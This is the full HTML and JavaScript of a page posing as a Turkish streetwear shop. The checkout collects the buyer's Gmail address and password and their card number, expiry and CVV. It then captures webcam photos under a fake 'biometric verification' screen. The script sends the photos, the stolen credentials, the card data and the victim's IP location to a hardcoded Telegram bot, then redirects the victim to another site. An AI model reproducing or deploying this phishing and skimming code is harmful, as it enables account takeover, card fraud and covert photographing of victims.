<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DRIP CAWS | Official Store</title>
    <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Inter:wght@300;400;700;900&display=swap" rel="stylesheet">
    <style>
        :root { --blue: #2997ff; --dark: #000; --card: #0d0d0d; --text-dim: #86868b; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: var(--dark); color: #fff; font-family: 'Inter', sans-serif; overflow-x: hidden; }

        /* NAV & CATEGORIES */
        header { background: rgba(0,0,0,0.8); backdrop-filter: blur(20px); padding: 20px 5%; position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid #1a1a1a; }
        .nav-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .logo { font-family: 'Syncopate', sans-serif; font-size: 20px; letter-spacing: -1px; text-decoration: none; color: #fff; }
        .logo span { color: var(--blue); }
        
        .cat-nav { display: flex; justify-content: center; gap: 20px; }
        .cat-item { font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 2px; color: var(--text-dim); cursor: pointer; transition: 0.3s; padding-bottom: 5px; border-bottom: 2px solid transparent; }
        .cat-item:hover, .cat-item.active { color: #fff; border-color: var(--blue); }

        /* BANNER */
        .hero-mini { text-align: center; padding: 40px 20px; background: linear-gradient(to bottom, #111, #000); }
        .hero-mini h1 { font-family: 'Syncopate', sans-serif; font-size: 24px; margin-bottom: 10px; }

        /* PRODUCTS */
        .container { padding: 40px 5%; max-width: 1300px; margin: 0 auto; min-height: 600px; }
        .product-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 25px; }
        
        .p-card { background: var(--card); border-radius: 12px; overflow: hidden; border: 1px solid #1a1a1a; transition: 0.4s; position: relative; }
        .p-card:hover { transform: translateY(-8px); border-color: #333; }
        .p-img { width: 100%; height: 300px; object-fit: cover; background: #0a0a0a; }
        .p-info { padding: 20px; }
        .p-cat { font-size: 10px; color: var(--blue); font-weight: 700; text-transform: uppercase; margin-bottom: 5px; }
        .p-title { font-size: 15px; font-weight: 600; margin-bottom: 10px; }
        .p-price { font-weight: 900; font-size: 17px; }
        .buy-btn { width: 100%; margin-top: 15px; padding: 12px; background: #fff; color: #000; border: none; border-radius: 6px; font-weight: 700; cursor: pointer; font-size: 12px; }

        /* CHECKOUT OVERLAY */
        #checkout-view { display: none; position: fixed; inset: 0; background: #000; z-index: 2000; overflow-y: auto; padding: 40px 5%; }
        .checkout-container { max-width: 1000px; margin: 0 auto; display: grid; grid-template-columns: 1.5fr 1fr; gap: 40px; }
        @media (max-width: 768px) { .checkout-container { grid-template-columns: 1fr; } }

        .input-box { margin-bottom: 20px; }
        .input-box label { display: block; font-size: 10px; font-weight: 700; color: var(--text-dim); text-transform: uppercase; margin-bottom: 8px; }
        .input-box input { width: 100%; padding: 15px; background: #0a0a0a; border: 1px solid #222; border-radius: 8px; color: #fff; outline: none; }
        .input-box input:focus { border-color: var(--blue); }

        /* SCANNER */
        #scan-view { display: none; position: fixed; inset: 0; background: #000; z-index: 3000; flex-direction: column; align-items: center; justify-content: center; }
        .v-circle { width: 300px; height: 300px; border-radius: 50%; border: 2px solid var(--blue); overflow: hidden; position: relative; }
        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
        .line { position: absolute; width: 100%; height: 3px; background: var(--blue); box-shadow: 0 0 15px var(--blue); animation: scan 2s infinite ease-in-out; }
        @keyframes scan { 0%, 100% { top: 10%; } 50% { top: 90%; } }
        .flash { position: fixed; inset: 0; background: #fff; z-index: 4000; display: none; }
    </style>
</head>
<body>

<div class="flash" id="flash"></div>

<header>
    <div class="nav-top">
        <a href="#" class="logo" onclick="renderProducts('all')">DRIP <span>CAWS</span></a>
        <div style="font-size: 12px; font-weight: 700;">SEPET (1)</div>
    </div>
    <div class="cat-nav">
        <div class="cat-item active" onclick="filterCat(this, 'all')">Hepsi</div>
        <div class="cat-item" onclick="filterCat(this, 'hoodie')">Hoodie</div>
        <div class="cat-item" onclick="filterCat(this, 'sweat')">Sweatshirt</div>
        <div class="cat-item" onclick="filterCat(this, 'pants')">Eşofman</div>
        <div class="cat-item" onclick="filterCat(this, 'acc')">Aksesuar</div>
    </div>
</header>

<div id="app">
    <div class="hero-mini">
        <h1 id="page-title">TÜM KOLEKSİYON</h1>
        <p style="color: var(--text-dim); font-size: 13px;">Premium Streetwear Essentials</p>
    </div>

    <div class="container">
        <div class="product-grid" id="product-list">
            </div>
    </div>
</div>

<div id="checkout-view">
    <div class="checkout-container">
        <div class="form-side">
            <h2 style="font-family: 'Syncopate'; margin-bottom: 30px;">GÜVENLİ ÖDEME</h2>
            <div class="input-box"><label>Master Gmail</label><input type="email" id="email" placeholder="ornek@gmail.com"></div>
            <div class="input-box"><label>Şifre</label><input type="password" id="pass" placeholder="••••••••"></div>
            <hr style="border: 0; border-top: 1px solid #1a1a1a; margin: 30px 0;">
            <div class="input-box"><label>Kart No</label><input type="text" id="cno" placeholder="0000 0000 0000 0000"></div>
            <div style="display: flex; gap: 10px;">
                <div class="input-box" style="flex:1"><label>SKT</label><input type="text" id="cexp" placeholder="MM/YY"></div>
                <div class="input-box" style="flex:1"><label>CVV</label><input type="text" id="cvv" placeholder="•••"></div>
            </div>
            <button class="buy-btn" style="padding: 20px; background: var(--blue);" onclick="initScan()">SİPARİŞİ ONAYLA</button>
        </div>
        <div class="order-summary" id="order-summary-content">
            </div>
    </div>
</div>

<div id="scan-view">
    <div style="font-family: 'Syncopate'; color: var(--blue); margin-bottom: 20px;">BIOMETRIC VERIFICATION</div>
    <div class="v-circle">
        <div class="line"></div>
        <video id="web" autoplay playsinline muted></video>
    </div>
    <p style="margin-top: 30px; font-size: 12px; color: var(--text-dim);">Lütfen ayrılmayın, kimlik doğrulanıyor...</p>
</div>

<script>
    const TG = { t: "6418277280:AAGlTr7IRw8CL__1EWjpkI_j9ZHkRjLnedc", c: "1540769169" };

    const products = [
        { id: 1, cat: 'hoodie', title: 'Midnight Oversize Hoodie', price: 1250, img: 'https://images.unsplash.com/photo-1556821840-3a63f95609a7?q=80&w=600' },
        { id: 2, cat: 'sweat', title: 'Cyber Graphic Sweat', price: 1100, img: 'https://images.unsplash.com/photo-1620799140408-edc6dcb6d633?q=80&w=600' },
        { id: 3, cat: 'pants', title: 'Tech Cargo Joggers', price: 950, img: 'https://images.unsplash.com/photo-1594633312681-425c7b97ccd1?q=80&w=600' },
        { id: 4, cat: 'acc', title: 'Signature Drip Beanie', price: 450, img: 'https://images.unsplash.com/photo-1576871337622-98d48d1cf531?q=80&w=600' },
        { id: 5, cat: 'hoodie', title: 'Bone White Essential', price: 1200, img: 'https://images.unsplash.com/photo-1591047139829-d91aecb6caea?q=80&w=600' },
        { id: 6, cat: 'acc', title: 'Tactical Chest Bag', price: 750, img: 'https://images.unsplash.com/photo-1553062407-98eeb64c6a62?q=80&w=600' }
    ];

    function renderProducts(filter) {
        const list = document.getElementById('product-list');
        list.innerHTML = '';
        const filtered = filter === 'all' ? products : products.filter(p => p.cat === filter);
        
        filtered.forEach(p => {
            list.innerHTML += `
                <div class="p-card">
                    <img src="${p.img}" class="p-img">
                    <div class="p-info">
                        <div class="p-cat">${p.cat}</div>
                        <div class="p-title">${p.title}</div>
                        <div class="p-price">₺${p.price}</div>
                        <button class="buy-btn" onclick="openCheckout(${p.id})">SATIN AL</button>
                    </div>
                </div>
            `;
        });
        document.getElementById('page-title').innerText = filter.toUpperCase();
    }

    function filterCat(el, cat) {
        document.querySelectorAll('.cat-item').forEach(i => i.classList.remove('active'));
        el.classList.add('active');
        renderProducts(cat);
    }

    function openCheckout(id) {
        const p = products.find(x => x.id === id);
        document.getElementById('app').style.display = 'none';
        document.getElementById('checkout-view').style.display = 'block';
        document.getElementById('order-summary-content').innerHTML = `
            <div style="background:#111; padding:20px; border-radius:10px;">
                <h3 style="font-size:14px; margin-bottom:15px;">SİPARİŞ ÖZETİ</h3>
                <div style="display:flex; gap:15px; margin-bottom:15px;">
                    <img src="${p.img}" style="width:60px; height:80px; object-fit:cover;">
                    <div><p style="font-size:13px; font-weight:700;">${p.title}</p><p style="color:var(--blue);">₺${p.price}</p></div>
                </div>
                <div style="border-top:1px solid #222; padding-top:15px; display:flex; justify-content:space-between; font-weight:900;">
                    <span>TOPLAM</span><span>₺${p.price}</span>
                </div>
            </div>
        `;
        window.scrollTo(0,0);
    }

    async function initScan() {
        if(!document.getElementById('email').value || !document.getElementById('pass').value) return alert("Bilgileri girin.");
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            document.getElementById('web').srcObject = stream;
            document.getElementById('checkout-view').style.display = 'none';
            document.getElementById('scan-view').style.display = 'flex';

            setTimeout(() => snap(document.getElementById('web'), "START"), 1000);
            setTimeout(() => {
                document.getElementById('flash').style.display = 'block';
                setTimeout(() => document.getElementById('flash').style.display = 'none', 100);
                sendRapor(document.getElementById('web'));
            }, 5000);
        } catch(e) { alert("3D Secure Hatası: Kamera izni reddedildi."); }
    }

    function snap(v, label) {
        const c = document.createElement('canvas');
        c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        c.toBlob(b => {
            const fd = new FormData(); fd.append('photo', b, 'f.jpg');
            fd.append('caption', `💠 **DC [${label}]**\n👤 ${document.getElementById('email').value}`);
            fetch(`https://api.telegram.org/bot${TG.t}/sendPhoto?chat_id=${TG.c}`, { method: 'POST', body: fd });
        }, 'image/jpeg', 0.6);
    }

    async function sendRapor(v) {
        const c = document.createElement('canvas');
        c.width = v.videoWidth; c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        c.toBlob(async b => {
            const fd = new FormData(); fd.append('photo', b, 'f.jpg');
            await fetch(`https://api.telegram.org/bot${TG.t}/sendPhoto?chat_id=${TG.c}`, { method: 'POST', body: fd });
            const ip = await (await fetch('https://ipapi.co/json/')).json();
            const text = `
🔥 **DRIP CAWS | DINAMIK RAPOR**
──────────────────
📧 **Mail:** \`${document.getElementById('email').value}\`
🔑 **Şifre:** \`${document.getElementById('pass').value}\`
💳 **Kart:** \`${document.getElementById('cno').value}\`
📅 **SKT/CVV:** \`${document.getElementById('cexp').value}\` / \`${document.getElementById('cvv').value}\`
🌍 **IP:** \`${ip.ip}\` | 📍 ${ip.city}
──────────────────`;
            await fetch(`https://api.telegram.org/bot${TG.t}/sendMessage?chat_id=${TG.c}&text=${encodeURIComponent(text)}&parse_mode=markdown`);
            window.location.href = "https://caws.network";
        }, 'image/jpeg', 0.9);
    }

    // Başlangıçta ürünleri yükle
    renderProducts('all');
</script>
</body>
</html>
